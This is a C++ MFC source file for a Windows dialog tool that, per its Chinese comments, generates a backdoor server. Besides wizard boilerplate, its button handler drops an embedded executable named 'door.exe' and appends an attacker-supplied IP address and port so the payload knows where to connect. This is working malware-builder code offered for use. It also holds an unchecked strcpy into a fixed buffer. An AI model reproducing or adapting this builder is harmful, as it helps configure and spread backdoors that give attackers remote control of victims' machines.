// nativeDlg.cpp : implementation file
//

#include "stdafx.h"
#include "native.h"
#include "nativeDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNativeDlg dialog

CNativeDlg::CNativeDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CNativeDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CNativeDlg)
	m_Ip = _T("");
	m_Port = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNativeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CNativeDlg)
	DDX_Text(pDX, IDC_EDIT1, m_Ip);
	DDX_Text(pDX, IDC_EDIT2, m_Port);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CNativeDlg, CDialog)
	//{{AFX_MSG_MAP(CNativeDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnShengCheng)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNativeDlg message handlers

BOOL CNativeDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CNativeDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CNativeDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CNativeDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
void ResourceToFile(char  *filename,char *Name,char* Type)
{

    HRSRC hRes = FindResource(NULL,Name,Type);
    HGLOBAL hgRes = LoadResource(NULL, hRes);
    void *pRes = LockResource(hgRes);
    DWORD size = SizeofResource(NULL, hRes);
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, 0);
    DWORD dwWrite;
    WriteFile(hFile, pRes, size, &dwWrite, 0);
    CloseHandle(hFile);
	GlobalFree(hgRes);
}
typedef struct _Info
{
	char ip[100];
	int port;
}Info;
void CNativeDlg::OnShengCheng() 
{
	//获得文本框内容
	UpdateData(TRUE);
	//把资源导出成文件
	ResourceToFile("door.exe",MAKEINTRESOURCE(IDR_EXE1),"EXE");
	char Path[256];
	Info mInfo={0};
	//得到文本框中的端口
	mInfo.port=atoi(m_Port.GetBuffer(m_Port.GetLength()));
	//得到文本框中的IP
	strcpy(mInfo.ip,m_Ip.GetBuffer(m_Ip.GetLength()));
	//以只写方式打开后门服务端文件
	HANDLE hFile=CreateFile("door.exe",GENERIC_WRITE,FILE_SHARE_READ,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		::MessageBox(NULL,"打开文件出错","错误",0);
		return;
	}
	//移动文件指针到文件末尾
    if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		::MessageBox(NULL,"移动文件指针出错","错误",0);
		return;
	}
	DWORD dwWrite;
	//写入配置信息
	if(!::WriteFile(hFile,&mInfo,sizeof(Info),&dwWrite,NULL))
	{
		::MessageBox(NULL,"写入文件出错","错误",0);
		return ;
	}
	//关闭文件句柄
	CloseHandle(hFile);
	::MessageBox(NULL,"恭喜你，生成文件成功","生成文件成功",0);	
}
